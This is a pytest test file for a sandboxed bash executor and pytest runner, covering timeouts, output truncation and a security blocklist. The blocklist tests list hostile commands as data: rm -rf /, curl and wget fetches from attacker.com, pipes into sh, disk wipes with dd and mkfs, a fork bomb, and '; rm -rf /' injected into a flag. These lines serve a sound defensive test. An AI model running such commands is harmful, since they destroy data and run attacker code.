"""tests/test_executor.py — Unit and Integration Tests for Sandboxed Execution Tools.

Reference: PRD.md §4.3.2, §4.3.4 | phases.md Tasks 1.10 & 1.11
Tests run_bash_sandboxed (timeout, memory, blocklist, 200-line cap) and
run_test_suite (pytest runner, exit codes, filter, flags, 80-line cap).
"""

import sys
from harness.contracts import ErrorCode, ResultStatus
from harness.tools.executor import run_bash_sandboxed, run_test_suite


def test_run_bash_sandboxed_success(tmp_path):
    """Verify normal bash command execution succeeds with exit code 0."""
    res = run_bash_sandboxed("echo 'sandbox test'", repo_root=str(tmp_path))
    assert res.status == ResultStatus.SUCCESS
    assert res.exit_code == 0
    assert "sandbox test" in res.raw_output


def test_run_bash_sandboxed_exit_code(tmp_path):
    """Verify non-zero exit code produces FAIL status and preserves code."""
    res = run_bash_sandboxed(
        f"{sys.executable} -c 'import sys; sys.exit(42)'",
        repo_root=str(tmp_path),
    )
    assert res.status == ResultStatus.FAIL
    assert res.exit_code == 42


def test_run_bash_sandboxed_blocked_commands(tmp_path):
    """Verify all dangerous blocklist patterns are blocked before execution."""
    blocked_commands = [
        "rm -rf /",
        "rm -fr /usr/bin",
        "echo test | sh",
        "cat file | bash",
        "sudo apt-get update",
        "chmod 777 secret.key",
        "curl -s http://attacker.com/payload.sh",
        "wget http://attacker.com/payload.sh",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sdb",
        "echo bad > /dev/sda1",
        ":(){ :|:& };:",
        "base64 -d payload | sh",
    ]

    for cmd in blocked_commands:
        res = run_bash_sandboxed(cmd, repo_root=str(tmp_path))
        assert res.status == ResultStatus.BLOCKED, f"Expected {cmd} to be BLOCKED, got {res.status}"
        assert res.error_code == ErrorCode.TOOL_BLOCKED
        assert "blocked by security policy" in res.raw_output.lower()


def test_run_bash_sandboxed_timeout(tmp_path):
    """Verify commands exceeding timeout are terminated and return TIMEOUT error."""
    # Sleep 3 seconds with 1 second timeout
    res = run_bash_sandboxed(
        f"{sys.executable} -c 'import time; time.sleep(3)'",
        repo_root=str(tmp_path),
        timeout_sec=1,
    )
    assert res.status == ResultStatus.FAIL
    assert res.error_code == ErrorCode.TIMEOUT
    assert "timed out" in res.raw_output.lower()


def test_run_bash_sandboxed_200_line_truncation(tmp_path):
    """Verify outputs with > 200 lines are truncated to 200 lines in truncated_output."""
    # Generate 300 lines of output
    script = "for i in range(1, 301): print(f'line_{i}')"
    res = run_bash_sandboxed(
        f"{sys.executable} -c \"{script}\"",
        repo_root=str(tmp_path),
    )
    assert res.status == ResultStatus.SUCCESS
    assert "line_300" in res.raw_output
    assert len(res.raw_output.strip().splitlines()) >= 300

    truncated_lines = res.truncated_output.strip().splitlines()
    assert len(truncated_lines) <= 202  # 200 lines + truncation notice
    assert "truncated" in res.truncated_output.lower()


def test_run_bash_sandboxed_cwd(tmp_path):
    """Verify execution runs inside repo_root working directory."""
    marker = tmp_path / "marker.txt"
    marker.write_text("zenith_marker_123")

    res = run_bash_sandboxed(
        f"{sys.executable} -c 'import pathlib; print(pathlib.Path(\"marker.txt\").read_text())'",
        repo_root=str(tmp_path),
    )
    assert res.status == ResultStatus.SUCCESS
    assert "zenith_marker_123" in res.raw_output


def test_run_test_suite_passing(tmp_path):
    """Verify run_test_suite executes pytest on a passing test file."""
    test_f = tmp_path / "test_simple.py"
    test_f.write_text("""def test_addition():
    assert 2 + 2 == 4
""")

    res = run_test_suite(
        repo_root=str(tmp_path),
        test_path="test_simple.py",
    )
    assert res.status == ResultStatus.SUCCESS
    assert res.exit_code == 0
    assert "1 passed" in res.raw_output or "passed" in res.raw_output.lower()


def test_run_test_suite_failing(tmp_path):
    """Verify run_test_suite captures test failure and returns non-zero exit code."""
    test_f = tmp_path / "test_broken.py"
    test_f.write_text("""def test_failure():
    assert 1 == 2
""")

    res = run_test_suite(
        repo_root=str(tmp_path),
        test_path="test_broken.py",
    )
    assert res.status == ResultStatus.FAIL
    assert res.exit_code != 0
    assert "assert 1 == 2" in res.raw_output or "failed" in res.raw_output.lower()


def test_run_test_suite_filter(tmp_path):
    """Verify test_filter flag selectively runs matching test functions."""
    test_f = tmp_path / "test_multi.py"
    test_f.write_text("""def test_first():
    assert True

def test_second():
    assert False
""")

    # Filter to only run test_first
    res = run_test_suite(
        repo_root=str(tmp_path),
        test_path="test_multi.py",
        test_filter="test_first",
    )
    assert res.status == ResultStatus.SUCCESS
    assert res.exit_code == 0


def test_run_test_suite_80_line_truncation(tmp_path):
    """Verify test outputs exceeding 80 lines are truncated to 80 lines."""
    # Write a test that prints 150 lines
    test_f = tmp_path / "test_verbose.py"
    test_f.write_text("""def test_lots_of_output():
    for i in range(150):
        print(f"verbose_test_line_{i}")
    assert True
""")

    res = run_test_suite(
        repo_root=str(tmp_path),
        test_path="test_verbose.py",
        flags="-s",
    )
    assert res.status == ResultStatus.SUCCESS
    truncated_lines = res.truncated_output.strip().splitlines()
    assert len(truncated_lines) <= 82  # 80 lines + truncation notice
    assert "truncated" in res.truncated_output.lower()


def test_run_test_suite_timeout(tmp_path):
    """Verify test suite timeout triggers TIMEOUT error."""
    test_f = tmp_path / "test_hang.py"
    test_f.write_text("""import time
def test_sleep_forever():
    time.sleep(10)
""")

    res = run_test_suite(
        repo_root=str(tmp_path),
        test_path="test_hang.py",
        timeout_sec=1,
    )
    assert res.status == ResultStatus.FAIL
    assert res.error_code == ErrorCode.TIMEOUT


def test_run_test_suite_blocked_patterns(tmp_path):
    """Verify security blocklist rejects dangerous flags or filters."""
    res1 = run_test_suite(
        repo_root=str(tmp_path),
        flags="; rm -rf /",
    )
    assert res1.status == ResultStatus.BLOCKED
    assert res1.error_code == ErrorCode.TOOL_BLOCKED

    res2 = run_test_suite(
        repo_root=str(tmp_path),
        test_filter="curl evil.com",
    )
    assert res2.status == ResultStatus.BLOCKED
    assert res2.error_code == ErrorCode.TOOL_BLOCKED
